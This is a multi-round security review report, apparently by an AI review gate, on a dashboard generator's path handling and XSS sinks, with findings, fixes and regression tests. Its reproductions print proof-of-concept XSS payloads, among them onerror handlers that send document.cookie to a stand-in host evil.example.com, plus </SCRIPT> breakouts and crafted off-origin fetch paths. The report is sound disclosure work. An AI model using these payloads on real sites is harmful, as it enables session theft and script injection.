# Security review — dashboard P0 review fixes, page-relative fetchPath, and the kit-identity stamp

Reviewed commit: `c47f380` — G7 · Threat, fresh context, three commits
(`git diff fefe92e..c47f380`), against the files as they exist at that sha. The fixes described
under "Remediation" are committed on top of it.

Files in scope, and why each is here:

- **`tools/dashboard.sh`** — T3 by `project/surfaces.conf` ("Tooling with several callers").
  New `_relpath()`, new `build_sources_json()` with the `fetchPath` splice, new `KIT_ID`.
- **`tools/dashboard/app.js`**, **`app.css`** — T1 ("Dashboard assets"). Reviewed anyway,
  because this is where untrusted text reaches the DOM and where the new `fetch()` target is
  dereferenced. Rating a file T1 does not make its `innerHTML` sinks T1.
- **`tests/run.sh`** — T3 ("The suite — if it stops asserting, nothing else here is
  trustworthy"). Two new generator tests.
- **`tests/dashboard-logic.test.js`** — not matched by any surfaces.conf row. Assertions only.

Highest tier in the change: **T3**, so G7 is a hard gate.

### Where the trust boundary actually is

`surfaces.conf` here is this repository's own answers, not the shipped example
(`SELF: gated-change`, `templates/surfaces.conf` is the example) — so these are the right
boundaries to review against. But the rows are about *who may break the kit's own tooling*, and
this change opens a boundary none of them describe, so naming it explicitly:

**The untrusted party for this change is whoever supplies a `ledger.jsonl` to the rendered
page** — not only whoever runs `dashboard.sh`. `app.js` accepts a ledger by **drag-and-drop**
(`wireDropzone`, "Drop another ledger.jsonl to view it") and, as of this very change, actually
**re-fetches one over the network** in live mode. Neither file was written or validated by
`tools/ledger.sh`. The kit already treats ledger *fields* as hostile — that is what
`security-reports/2026-08-13-587e8e1.md` and `-ledger-injection-fix-round2.md` are about, and
why `ledger.sh` validates `--round` as a uint before writing it. The dashboard is the consumer
that must not assume the writer did.

The second untrusted party is **the caller of `dashboard.sh`** — `--ledger` / `--out` are raw
strings that now feed string math whose output becomes a URL the page dereferences.

## What the diff does

1. **`_relpath()` + `fetchPath`** (`tools/dashboard.sh:393-436, 605-630`, `app.js` in
   `fetchOneSource`). `dashboard.sh` resolves the ledger relative to its CWD; a browser resolves
   a relative `fetch()` against the page URL. `_relpath` computes the second from the first with
   pure awk string math, bakes it per source as `src.fetchPath`, and `app.js` fetches that
   instead of `src.path`. Live mode, which had been silently 404-ing forever, now works — so a
   network read that was previously dead is now a live input path.
2. **The splice** moved from `${src/#\{/$rep}` to prefix-strip + concatenation
   (`dashboard.sh:624`), fixing a round-1 corruption on `&` in the path.
3. **`KIT_ID`** replaces `git rev-parse --short HEAD` in the model's `kitCommit`
   (`dashboard.sh:520-543`): `VERSION` file content plus a `cksum` of the kit's shell.
4. **`app.js` P0 fixes**: rounds sorted by date not by number, `skipped`/`n/a` no longer count
   as a verdict, every route record kept, coverage headline no longer green when commits landed
   below the gated line.

## Trust boundary walk

**1 · Can a crafted path break out of the JSON string, or out of `<script>`?**
No. Traced every hop and tested it. `_relpath`'s output goes through the same `json_escape` as
`src.path` (backslash first, then quote, then tab/CR, then newline-folding — correct order), and
the whole sources array then goes through `escape_payload`, which neutralises `</script` and
`<!--` for the payload as a whole. Generated pages with `"` and `&` in the ledger path: the
quote round-trips as `\"`, the `&` survives intact, `JSON.parse` of the line succeeds, and no raw
`</script` appears anywhere between the page's `<script>` and its `</script>`. **The round-2
splice fix is sound** — prefix removal has no replacement string, so bash's `&`/`\\` replacement
rule cannot apply. Confirmed with a ledger under `a & b/` and under `q"dir/`.

**2 · Where does `fetchPath` actually point?** This is the finding. See G7-1.

**3 · Can ledger content reach the DOM unescaped?** Mostly no — `friendlyGateLine`'s sentence
(including the new `run.outcome` interpolation) is `escapeHtml`'d at the call site, `stateLines`
output reaches SVG via `textContent`, and `outcomeClass` now returns a fixed vocabulary rather
than a raw outcome. One value is not escaped. See G7-2.

**4 · Did privilege grow?** Yes, and it is remarked here rather than left implicit: the page
gained a **working outbound network read** it did not previously have in practice. `initLive`
still refuses under `file://`, and the fetch is same-origin *by intention* — but nothing enforced
that, which is G7-1.

**5 · Model fields.** `coverage.commits` and `unrouted.length`, newly interpolated raw into
`renderCoverage`'s headline, are integers produced by `tools/lib/coverage.sh` (`git rev-list
--count`, and a row count), not free text; the free-text parts (`c.anchor`, `u.text`) still go
through `escapeHtml`. `kitCommit` is a new free-text field — see G7-3.

**6 · Not findings, checked and cleared.** `_relpath` compares path *components*, so
`.pipeline-old` vs `.pipeline` does not falsely share a prefix. A symlinked `--ledger` is not
resolved, which is correct — the browser asks the server, which resolves it or does not.
`${src#\{}` is safe because `$src` is built with a literal leading `{`. The pre-push hook passes
a relative `$PIPELINE_DIR` pair, so the committed `dashboard.html` bakes `"fetchPath":"ledger.jsonl"`
and leaks no local absolute path. `escape_payload` emitting `\!` is invalid JSON but valid JS,
and these payloads are JS source literals, not `JSON.parse` input — unchanged, and fine.

## Findings

### BLOCKING — `_relpath` can emit a fetch reference that leaves the page's origin

`tools/dashboard.sh:403` (`_relpath`), dereferenced at `tools/dashboard/app.js` `fetchOneSource`.

`abs()` collapses `/./` and trailing slashes but **not repeated slashes**, and repeated slashes
are meaningless to a filesystem but load-bearing in a URL. When a doubled slash lands in the
common prefix, the emitted reference begins with `/`; when a tripled one does, it begins with
`//`. Reproduced end to end against `c47f380`, generator through baked page:

```
--ledger "$PWD///evil.example.com/ledger.jsonl" --out ./b.html
  → "fetchPath":"//evil.example.com/ledger.jsonl"
  → fetch() resolves to  http://evil.example.com/ledger.jsonl

--ledger "$PWD//.pipeline/ledger.jsonl"        --out ./c.html
  → "fetchPath":"/.pipeline/ledger.jsonl"
  → fetch() resolves to  http://<host>/.pipeline/ledger.jsonl     (the server ROOT)
```

The first is a **cross-origin read whose response `refreshLive()` ingests and `renderAll()`
renders as this project's gate record** — an attacker-controlled host, sending its own CORS
header, decides what the pipeline dashboard says was reviewed and what passed. It is also a
beacon: every focus/visibility change pings that host. The second needs no attacker at all —
`--ledger "$ROOT/$SUB/ledger.jsonl"` with `$SUB` empty is the whole exploit, and on a host
serving several projects' pages it silently renders **another project's ledger** under this
project's name. That is the kit's own named defect class: a confident wrong answer, silently.

Two contributing causes, both fixed: `awk -v` also runs its value through escape-sequence
processing, so a ledger under `a\057b/` emitted `a/b/` — an extra path separator the real
filename never had (`a\tb/` → tab, `a\nb/` → a raw newline in the reference).

Severity is blocking rather than minor because a trust boundary — the page's own origin — is
crossed with no check of any kind on either side of it, which is this gate's stated `fails_when`.

### BLOCKING — a crafted ledger injects markup through the round label (introduced here)

`tools/dashboard/app.js:1120-1125` (`renderRail`), root cause at `app.js:172`
(`buildExecutions`).

The diff replaced `Object.keys(byChange[change]).map(Number).sort(...)` with a plain
`Object.keys(...).map(...)`. That `Number` was doing unintended safety work: a ledger line
carrying a non-numeric `"round"` mapped to `NaN`, the lookup returned `undefined`, and
`buildExecutions` threw before anything rendered. Verified against `fefe92e`:
`TypeError: Cannot read properties of undefined (reading 'date')` — no HTML written.

Without it the value survives to `rail.innerHTML`, which interpolates it **twice** with no
escaping — once into the `data-round` attribute and once, new in this change, into element
content. Executed `renderRail` against a two-record crafted ledger and read the resulting HTML:

```
<div class="exec-row" data-round="<img src=x onerror="fetch('//evil.example.com/?c='+document.cookie)">">
  <span class="round">review 2 of 2 · logged as round <img src=x onerror="fetch(…)"></span>
```

Reachable by the untrusted parties named above: a dropped ledger, a fetched ledger (G7-1 makes
that attacker-chosen), or a `ledger.jsonl` committed by an untrusted contributor to a repo whose
`dashboard.html` is served. `ledger.sh` validating its own `--round` does not help — none of
these three files came from `ledger.sh`. Four further sinks share the same value and were
unescaped for the same reason (`app.js:871`, `:1260`, `:1465`, `:1477`).

### MINOR — `VERSION` file content is spliced into the page model unescaped

`tools/dashboard.sh:534` (`KIT_ID`), consumed at `dashboard.sh:540` (`"kitCommit":"$KIT_ID"`).

The field this replaced was `git rev-parse --short HEAD` — constrained hex, safe raw. `_kit_v`
is arbitrary file bytes with only `tr -d ' \t\r\n'` applied, and every sibling value in `MODEL`
is `json_escape`'d. Confirmed both consequences against `c47f380` by planting a `VERSION`:

- `1.0.0","x":"pwned` → an extra key appears in `PIPELINE`. Later keys win in a JS object
  literal, so `gates` or `matrix` could be replaced wholesale — the dashboard would then render
  a different gate matrix than `core/01-router.md` defines.
- `1.0.0"+(globalThis.PWNED=1)+"` → **executes on page load** (`PWNED = 1`, verified).

Rated minor, not blocking: whoever controls `$KIT/VERSION` normally also controls `$KIT/tools/
dashboard/app.js`, so no privilege is gained over an already-compromised kit. The realistic
cost is the non-malicious one — a fork or vendor writing `VERSION` as `1.0.0 (build "x")` makes
`const PIPELINE` a syntax error and the **entire page goes blank**, while `dashboard.sh` exits 0
and prints "Wrote …". It is a regression against this file's own escaping discipline and the fix
is one call to a function already defined 140 lines above it.

### INFO — `roundsInDateOrderAreSequential` uses `!==` against a number

`tools/dashboard/app.js:206`. A round logged as the *string* `"1"` is never `=== 1`, so a ledger
whose rounds are all strings always reads as non-sequential and shows "logged as round …" rather
than "round N of M". Cosmetic, correct-erring, and now harmless since the value is escaped. Left
as-is deliberately: coercing here would re-hide the class G7-2 is about.

## Remediation applied

- `tools/dashboard.sh:403-443` — `_relpath` takes its inputs through `ENVIRON` instead of
  `awk -v`, and `abs()` collapses every run of slashes.
- `tools/dashboard/app.js` — new `ledgerRefIsSafe()` gates `fetchOneSource`: a reference
  starting `/` (server-root or protocol-relative), carrying any scheme (`http:`, and `data:`,
  which `fetch()` resolves happily), or resolving off-origin is refused. Refusal is loud — the
  promise rejects, the source keeps its last-good lines, the live pill reads "degraded", and the
  reason is on the console. Kept as a second check at the sink on purpose: pages generated by
  older and forked copies of `dashboard.sh` already exist and will be opened.
- `tools/dashboard/app.js` — all six renders of a `.round` go through `escapeHtml`/`attr`, with
  a comment at `buildExecutions` recording why the removed `Number` mattered.
- `tools/dashboard.sh:534` — `KIT_ID` is `json_escape`'d. The pre-push hook's
  `s/"kitCommit":"[^"]*"/` normaliser still matches, since escaped output carries no bare quote.
- `tests/dashboard-logic.test.js` — two regression tests. Both **fail against `c47f380`** and
  pass against the fix (verified by checking out the old `app.js` and re-running). `renderRail`
  is now exported for the same stated reason `renderCoverage` already was: the sink is DOM-bound,
  and no DOM-free export could have caught this.

Re-verified after the fix: the `//` and `/` payloads emit ordinary relative references; the
`VERSION` payload neither executes nor injects a key; `tests/run.sh test_dashboard` 26 passed,
0 failed; `tests/dashboard-logic.test.js` all passed, including the change's own two new
generator tests for the page-relative path and the `&` regression.

## Note for the T4 approver

Every edit above was made by this gate, not by the change's author, and each one touches a T3
surface (`tools/dashboard.sh`) — the kit's own R0c hook fired on each. Per this card's
`escalate_to`, the remediation commit needs a separate approval; a G7 that fixes what it found
must not also be the sole reviewer of its own fix.

---

# Round 2 — reviewed commit `d25a867`

G7 · Threat, fresh context, round 2. Reviewed the change as it now stands: `git diff
fefe92e..d25a867`, 8 commits, against the files at **`d25a867`** — including the three commits
that landed *after* round 1 and were written by other gates (`97e3006` G8 dogfooding,
`515836f` G4 Ripple, `d25a867` G6 Peer). None of those was taken on trust; each was re-walked.

Method, in short: `_relpath` extracted from `tools/dashboard.sh` and fuzzed directly with 24
crafted target/base pairs; the generator run end to end against crafted `--ledger`/`--out`
paths and a crafted `ledger.jsonl`; `ledgerRefIsSafe` read against the WHATWG URL parser's
actual behaviour rather than its comment; every `innerHTML` sink in `app.js` re-enumerated and
each interpolation traced back to whether the value is generator-computed or ledger-supplied.

## Round-1 findings — do the fixes hold?

**G7-1 — off-origin `_relpath` fetch reference + `ledgerRefIsSafe`. HOLDS.**
Both halves verified independently.
- Generator: `abs()` collapsing every run of slashes is effective. `$PWD///evil.example.com/
  ledger.jsonl` now emits `evil.example.com/ledger.jsonl` (an ordinary relative reference, one
  directory down) and `$PWD//.pipeline/ledger.jsonl` emits `.pipeline/ledger.jsonl`. Nothing in
  24 probes produced an output beginning `/` or `//` — structurally it cannot, because both
  paths are absolutised before the walk, so `ta[1] == ba[1] == ""` always matches at i=1 and the
  first emitted segment is therefore never empty.
- The `ENVIRON` fix is effective: `a\057b/` emits `a/057b/`, not `a/b/` — the synthesised path
  separator is gone, and `a\tb/`, `a\nb/` likewise stay literal.
- Sink: `ledgerRefIsSafe` is correct, including against inputs its comment does not mention. A
  backslash reference (`\\evil.example.com/x`), which the WHATWG parser rewrites to `//` for
  special schemes, is refused — not by the `charAt(0) === "/"` test, which misses it, but by the
  `new URL(ref, b).origin === new URL(b).origin` comparison, which is doing the real work as a
  backstop. Leading-whitespace and leading-newline forms resolve inside the origin and so are
  correctly allowed rather than incorrectly refused.
- The round-2 `..` resolution (`d25a867`) and drive-letter normalisation (`515836f`) both hold
  and neither opens a new hole: `_relpath .pipeline/ledger.jsonl ../site` no longer climbs a
  level too far, a leading run of `..` on an absolute path is kept rather than dropped (so the
  answer is visibly odd rather than confidently wrong), and `D:\x\ledger.jsonl` normalises to
  the `/d/x/...` form before the comparison. One residual shape, now fixed — see G7R2-3.

**G7-2 — a crafted ledger injects markup through the round label. HOLDS.**
All six renders of a `.round` go through `escapeHtml`/`attr` (`app.js:934, 1185, 1186, 1188,
1538, 1550`), and `attr()` — not `escapeHtml()` — is used at the one attribute position
(`data-round`), which matters because `escapeHtml` does not touch `"`. The regression test
(`tests/dashboard-logic.test.js`, "a non-numeric round … is escaped") passes and still asserts
both halves: not raw, and not dropped. The fix, however, swept only the field round 1 happened
to find. See G7R2-2.

**G7-3 — `VERSION` file content spliced into `kitCommit` unescaped. HOLDS.**
Re-planted both round-1 payloads against `d25a867`:
- `1.0.0","x":"pwned` → emitted as `"kitCommit":"1.0.0\",\"x\":\"pwned+…"`; zero occurrences of
  a sibling `"x":"pwned"` key in the page. No key injection.
- `1.0.0"+(globalThis.PWNED=1)+"` → emitted as `1.0.0\"+(globalThis.PWNED=1)+\"`; a JS string,
  not an expression. No execution.
- `kitCommit` is consumed at `app.js:1786` via `textContent`, not `innerHTML`, so the escaped
  value is also safe at its sink.

## New findings

### BLOCKING — `escape_payload` matches only lowercase `</script`, and HTML does not

`tools/dashboard.sh:711-713` at `d25a867` (`escape_payload`), consumed at `MODEL_SAFE` and at
`assemble_html`'s `ledgers_safe`.

```sh
printf '%s' "$1" | sed -e 's#</script#<\\/script#g' -e 's/<!--/<\\!--/g'
```

HTML's script-data end-tag matching is **ASCII case-insensitive** — `</SCRIPT>` ends a
`<script>` element exactly as `</script>` does. The sed only ever rewrote the lowercase
spelling. Reproduced end to end against `d25a867` with a ledger note carrying all three
spellings; the generated page contains:

```
lowercase <\/script><img src=x onerror=alert(1)>          ← neutralised
UPPERCASE </SCRIPT><img src=y onerror=alert(2)>           ← RAW, inside the page's own <script>
mixed     </ScRiPt><img src=z onerror=alert(3)>           ← RAW
```

The `</SCRIPT>` closes the script element and everything after it is parsed as markup.

Why this is the worst of the three: it breaks out at **generation time**, so it is *upstream of
every `escapeHtml()` in `app.js`* — none of them is reached, and the round-1 and round-2 sink
fixes do not mitigate it. It needs no live mode and no server: it fires on `file://` too. And
it is the exact containment layer round 1 leaned on to clear the `fetchPath` splice ("no raw
`</script` appears anywhere between the page's `<script>` and its `</script>`") — that clearance
was true only for the lowercase spelling, which is round 1's own miss.

Three untrusted inputs reach it, all named in round 1's own boundary section: a ledger `note`
(dropped, fetched, or committed by an untrusted contributor); a **git commit subject**, which
the Coverage panel splices into `_cov_rows`; and the `--ledger` path itself, via `path` and
`fetchPath`. `tools/ledger.sh` validating what *it* writes is irrelevant — none of those three
came from `ledger.sh`.

Severity blocking: an untrusted value crosses into script-execution context with a check that
does not hold, which is this card's stated `fails_when`.

### BLOCKING — three more ledger-derived values reach `innerHTML` unescaped in the drawer

`tools/dashboard/app.js:1521` (`run.minutes`), `:1526` (`f.severity`, twice), `:1531`
(`run.findings`), all inside `renderDrawer`.

Round 1 found this class in `.round` and swept `.round`. `minutes`, `severity` and `findings`
are the same thing — raw ledger values, with nothing between `JSON.parse` and the sink that
coerces them — and were left unescaped. Executed against a crafted record:

```html
<b><img src=x onerror="fetch('//evil.example.com/?c='+document.cookie)">m / 20m</b>
<div class="finding blocking" onmouseover="alert(1)"><b>blocking" onmouseover="alert(1)</b>
<div class="finding <svg onload=alert(2)>"><b><svg onload=alert(2)></b>
```

`severity` is interpolated **twice**, once inside a `class="…"` attribute, so it breaks out of
the attribute as well as into element content. `minutes` needs no guard at all to reach the
sink. (`findings` is guarded by `run.findings > 0`, which a markup string fails, so that one is
hardened for consistency rather than because it is reachable.)

These sinks pre-date `fefe92e`, but they are in scope for this gate and this round for two
reasons. First, the diff is what makes them reachable *at runtime*: live mode had been silently
404-ing forever and now works, so a `ledger.jsonl` rewritten on the server after the page was
generated is fetched, ingested and re-rendered with no regeneration and no user action beyond
focusing the tab. Second, round 1 established the untrusted party and fixed one field of it;
finding the siblings is what round 2 is for.

### INFO — `_relpath` could emit a scheme-shaped reference

`tools/dashboard.sh` (`_relpath`, the `BEGIN` block).

A path *segment* containing a colon reads as a URL scheme once the common prefix is stripped:

```
_relpath "$PWD/https:/evil.example.com/ledger.jsonl" "$PWD"
  → https:/evil.example.com/ledger.jsonl
  → new URL(...) resolves to  https://evil.example.com/ledger.jsonl     (off origin)

_relpath "$PWD/data:text/html,<script>alert(1)</script>" "$PWD"
  → data:text/html,<script>alert(1)</script>                            (the reference IS the payload)
```

Rated info rather than blocking because `ledgerRefIsSafe` already refuses any `scheme:` at the
sink, so the page does not fetch either — this is one layer, not zero — and `:` is not a legal
filename character on Windows, the kit's primary TARGET. But `dashboard.sh`'s own comment claims
"dashboard.sh no longer emits any of these", and that claim was false. Fixed at the generator so
it is true.

### INFO — a literal backslash in a POSIX filename becomes a path separator

`tools/dashboard.sh` (`abs()`, `gsub(/\\/, "/", p)`). `a\b/ledger.jsonl` — one legal directory
name on Linux — emits `a/b/ledger.jsonl`, an extra path separator the real filename never had.
That is the same shape as round 1's `awk -v` finding, but the consequence here is only a 404 and
a silent return to "Snapshot forever"; the reference stays relative and same-origin. The
normalisation is load-bearing on Git Bash, where the kit is developed, so this is a deliberate
trade and is left as-is, named rather than silently accepted.

### Checked and cleared (not findings)

- **Coverage's foreign-repo guard** (`97e3006`). Probed a real second git repo in all three path
  forms — POSIX `/tmp/...`, drive-letter `C:/...`, and drive-letter with **backslashes**
  `C:\...`. All three emit `"coverage":null`. The `dirname` walk terminates on `.`, `/` and
  `//`, so no spin. The guard holds; the backslash form I expected to slip through does not.
- `_cov_never_json` interpolates its fields raw, but they are gate ids from `matrix_gates`
  (the kit's own `core/01-router.md`), not ledger data.
- `run.outcome` at `app.js:711` is interpolated raw into `sentence`, but every `sentence` is
  `escapeHtml`'d at the call site (`:953`); `loopHistoryText`'s output likewise (`:959`).
- `pct` at `:1522` is `Math.min(100, …)` of a division — a number or `NaN`, never text.
- `coverage.commits`, `scanned`, `occ.length`, `cg.rounds.length`, `sum.totalGates` are counts.
- Ledger paths containing `"`, `&`, and `</script>` still round-trip correctly through
  `json_escape` + the (now case-insensitive) `escape_payload`; the `${src#\{}` splice from
  `c47f380` remains sound.

## Remediation applied (round 2)

- `tools/dashboard.sh` `escape_payload` — the tag name is matched with explicit character
  classes, `s#</\([Ss][Cc][Rr][Ii][Pp][Tt]\)#<\\/\1#g`. **Not** `sed`'s `/I` flag, which is
  GNU-only while `project/surfaces.conf` lists macOS/BSD as a TARGET; `\(...\)`/`\1` are POSIX
  BRE. The backreference keeps the note's original spelling on screen — only the slash is
  escaped. The pre-push hook's `kitCommit` normaliser is unaffected.
- `tools/dashboard.sh` `_relpath` — an output whose first segment reads as a scheme is prefixed
  `./`.
- `tools/dashboard/app.js:1521/1526/1531` — `escapeHtml(run.minutes)`, `attr(f.severity)` in the
  class attribute and `escapeHtml(f.severity)` in content, `escapeHtml(run.findings)`.
- `tools/dashboard/app.js` — `renderDrawer` and a `_selectExec` setter exported, for the same
  stated reason `renderCoverage` and `renderRail` already are: the sink is DOM-bound and no
  DOM-free export could catch this.
- `tests/run.sh` — `test_dashboard_payload_escaping_is_case_insensitive`. Asserts exactly one
  un-escaped `</script` in the whole page (the page's own tag), three escaped ones, and that the
  note still reads in its original case. **Fails 3/4 against `d25a867`**, passes after.
- `tests/dashboard-logic.test.js` — "crafted minutes/severity/findings are escaped in the
  drawer". Asserts not-raw, not-broken-out-of-the-attribute, and still-shown-escaped.
  **Fails against `d25a867`'s sinks** (verified by reverting the three interpolations with the
  exports left in place, so the failure is the sink and not a missing export), passes after.

No test for the scheme-shaped `_relpath` output: it needs a directory literally named `https:`,
which cannot exist on Windows — the platform `tests/run.sh` primarily runs on. Flagged here
rather than papered over with a test that would only ever skip.

## Note for the T4 approver

Same standing as round 1, and it now applies twice. Every edit above was made by this gate, not
by the change's author; `tools/dashboard.sh` and `tests/run.sh` are both T3 rows in
`project/surfaces.conf` and the kit's own R0c hook fired on each edit. Per this card's
`escalate_to`, the round-2 remediation commit needs a separate approval — and specifically it
should not be approved by round 1's G7 either, since two of the three new findings are round 1's
own misses.

One of those edits also demonstrates why: the first draft of the `_relpath` hardening put an
apostrophe (`app.js's`) inside the single-quoted awk program and broke the function outright.
`bash -n` does not catch it — the shell parses fine — and it was caught only because the fuzz
harness was re-run afterwards. The comment now carries that warning inline.

---

# Round 3 — reviewed commit `8796edb`

G7 · Threat, fresh context, round 3, HARD GATE (highest surface in the change is `tools/dashboard.sh`,
a T3 row in `project/surfaces.conf`).

**Model: `claude-sonnet-5`.** Opus 5 is rate-limited for this account; Sonnet 5 is the strongest
model currently available and this run was done on it. Logged as `--model claude-sonnet-5`.

**Worktree base.** The worktree came up at `fefe92e` (12 commits behind), not the required
`8796edb`. Reset with `git reset --hard 8796edb` before starting; every check below is against
the files as they exist at `8796edb`.

Round 3 does two things: re-verify the round-2 fixes still hold *by execution* against `8796edb`,
and walk everything that landed after the round-2 review commit (`27e41f1`) for a new sink or a
new regex on untrusted data.

Method: `escape_payload` exercised end to end through the generator with a crafted `ledger.jsonl`
carrying every case spelling of `</script>`; `renderDrawer`, `renderRail`, `changeSummary` and
`renderCoverage` driven under a DOM shim against the real `PIPELINE`/`LEDGERS` model lifted out
of a generated page, fed a ledger whose `minutes`/`severity`/`findings`/`round`/`actual` are all
markup; `_relpath` extracted and fuzzed over 11 scheme/slash/backslash shapes; `ledgerRefIsSafe`
run against the WHATWG URL parser for each of those outputs. `node tests/dashboard-logic.test.js`
passes in full at `8796edb`, including every G7 round-1/2/3 injection-regression case
(`.round`, drawer `minutes`/`severity`/`findings`, the off-origin/scheme fetch reference). The
full `tests/run.sh` suite also passes at `8796edb` — **617 passed, 0 failed, 0 skipped** — after
a long run (concurrent `newrepo` fixtures on Git Bash / Windows serialise heavily). Its
security-relevant assertion `test_dashboard_payload_escaping_is_case_insensitive` was also
reproduced by hand end to end (see G7R2-1 below).

## Round-2 findings — do the fixes hold?

**G7R2-1 — `escape_payload` matches only lowercase `</script`. HOLDS.**
Regenerated a page from a ledger whose `note`, a finding `location`, and a `route.actual` each
carry `</script>`, `</SCRIPT>` and `</ScRiPt>`. The generated page contains **exactly one**
un-escaped `</script` (its own closing tag); all four payload occurrences emit `<\/SCRIPT`,
`<\/script`, `<\/ScRiPt` — the slash escaped, the original case preserved. The
`s#</\([Ss][Cc]…\)#<\\/\1#g` BRE with the backreference is doing exactly what round 2 said.
`<!--` likewise folded to `<\!--`.

**G7R2-2 — `run.minutes` / `f.severity` (×2) / `run.findings` unescaped in `renderDrawer`. HOLDS.**
Drove `renderDrawer` against a crafted gate record. Every value reaches the DOM escaped:
`7&lt;img src=x onerror=…&gt;` for `minutes`, `&lt;svg onload=…&gt;` for `severity` in element
content, and — the one that matters — `class="finding blocking&quot; onmouseover=…"` for
`severity` in the class attribute: `attr()` turned the `"` into `&quot;`, so it does **not**
break out of the attribute. `location` and `claim` (same record, same class of value) are
escaped too. The `.round` fix from rounds 1–2 also still holds: a markup `round` renders as
`2&lt;img…&gt;` in the rail, the drawer, and the loop-history line.

**G7R2-3 — `_relpath` could emit a scheme-shaped reference. HOLDS.**
`_relpath "$PWD/https:/evil.example.com/ledger.jsonl" "$PWD"` now emits
`./https:/evil.example.com/ledger.jsonl` (the `^[A-Za-z][A-Za-z0-9+.-]*:` guard fires and
prepends `./`), which `new URL(ref, base)` resolves to `http://<host>/<dir>/https:/…` — **on
origin**, a 404, not `https://evil.example.com/…`. Same for `data:`, `HTTPS:` (case), and a
colon segment deeper in the path. `ledgerRefIsSafe` at the sink is the intact second layer: it
still refuses any `/`-prefixed ref (`//host`, `/root`) and any `scheme:` ref, and its
`origin === origin` backstop still catches the backslash form the WHATWG parser rewrites.

The round-1 fixes carried forward with them: `abs()` collapsing every run of slashes (no output
begins `/` or `//` in 11 probes), the `ENVIRON`-not-`awk -v` input path (a `\057` in a POSIX
filename is not turned into a path separator), and `KIT_ID` going through `json_escape`
(`tools/dashboard.sh:603`, consumed at `:609` and rendered via `textContent` at
`app.js` `boot()`). `tools/dashboard.sh` is byte-identical to `27e41f1` — nothing since round 2
touched the generator.

## What changed since `27e41f1`, and does it open anything?

Two commits landed after the round-2 review: `edec8c6` (G4 Ripple round 2 — `project/map.md`
and `project/risks.md` only, no code) and `8796edb` (G4/G8 round-2 fixes, `tools/dashboard/app.js`
and `tests/dashboard-logic.test.js` only). Every new or changed path in `app.js`:

- **`SUPER = "[¹²³⁰⁴⁵⁶⁷⁸⁹]"` → `new RegExp("^(" + SUPER + ")\\s*…")` and `new RegExp(SUPER)`**
  (`indexFootnotes`, `footnoteText`). `SUPER` is a static string literal — nothing
  attacker-controlled enters the regex *construction*. The strings matched *against* it are
  `PIPELINE.footnotes` entries and `PIPELINE.matrix` cells, both derived by `dashboard.sh` from
  `core/01-router.md` (confirmed in a generated page: the footnotes are the router's, the matrix
  is the gate matrix), never from the ledger. The pattern is a one-char class plus `\s*(.*)$` —
  no catastrophic backtracking even on a hostile subject. Not a finding.
- **`cellIsConditional(cell)`** — `String(cell).replace(/M/g,"")…` with four static regexes on
  `PIPELINE.matrix[g][tier]`, generator-derived as above. Result is a boolean into
  `computeStatus`. Not a finding.
- **`buildExecutions` `_stamp` / `ex.startDate`** — `startDate` is the min of `r.date` (a ledger
  value) across a round's entries. It is used in exactly one place: `rounds.sort()`, as the left
  operand of `localeCompare`. It is never interpolated into HTML anywhere. A crafted `date`
  can only mis-order rounds on the page — a display-correctness effect that is G6's / G8's
  domain, not a trust-boundary crossing. Not a finding.
- **`actualTier(ex)` — recency instead of max.** It now sorts `ex.routes` by `.date`
  (`localeCompare`) and returns the last `.actual`. `.actual` is a ledger string; it was already
  a ledger string reaching this function and `requiredGates()` under the old `max`-across-routes
  logic, so no *new* untrusted value reaches a sink — only a different one of the same already-
  hostile set. Both render sites wrap it: `escapeHtml(actualTier(sum.last))` at `app.js:965`
  and `escapeHtml(actualTier(last))` at `:1354` (verified: a crafted `actual` of
  `T4"><svg onload=…>` is selected by `actualTier` and rendered escaped). Its other consumer,
  `requiredGates(tier)` at `:399`, does a `PIPELINE.matrix[g][tier]` lookup — a garbage tier
  yields `undefined`/`""` and the gate is simply not counted as required. That lets a hostile
  ledger under-state its own mandated gates on the page, which is the kit's already-named
  "confident wrong answer" class and is unchanged in kind from what rounds 1–2 accepted (a
  hostile ledger controls what the dashboard claims about the hostile ledger). Not a new
  boundary. Not a finding above low.
- **`renderDrawer` `run = _runs[_runs.length - 1]`** — still a ledger `gate` record, every
  field escaped at the sink as verified under G7R2-2. Picking the last entry rather than the
  first changes *which* record's values are shown, not whether they are escaped. Not a finding.
- **`boot()` `sources` — `l.project !== l.path`** — both operands are set by `dashboard.sh`
  (`LEDGERS[].path` is the `--ledger` string, `.project` is derived from it); the result is
  assigned via `document.getElementById("sources").textContent`, not `innerHTML`. Not a finding.

## Findings

**None above low.** The three round-2 fixes hold under execution against `8796edb`, and the
`app.js` changes in `8796edb` introduce no new sink and no new regex over ledger-supplied data —
every new interpolation of a ledger value goes through `escapeHtml`/`attr`, and every new regex
runs only over generator-derived model fields.

### INFO — `actualTier` recency can lower a round's displayed mandated-gate set

`tools/dashboard/app.js:288` (`actualTier`) → `:399` (`requiredGates`). A hostile ledger that
logs a later `route` with a lower `actual` for a round now has that lower tier govern
`requiredGates()` on the page, so the page can show fewer mandated gates than the change's
worst reconcile implied. This is the deliberate G4-Ripple-2 behaviour ("a correction downward
must be reachable, the ledger is append-only") and it only ever misrepresents the same hostile
ledger that supplied the routes — no real pipeline's enforcement is affected, and `ledger.sh`'s
own `cmd_compliance` reads the ledger directly, not the page. Rated info and left as-is:
changing it would re-introduce the P0-8 regression G4 Ripple fixed. Named here so the trade is
on record rather than silently inherited.

## Remediation applied (round 3)

None. No finding above low; nothing to fix.

## Note for the T4 approver

This round made no code edits — only this report section was written and committed, on
`tools/dashboard.sh`/`app.js`'s sibling `security-reports/` path (not itself a gated surface).
The round-1 and round-2 remediation commits still stand on their own approvals as their
respective notes describe; nothing here changes that.
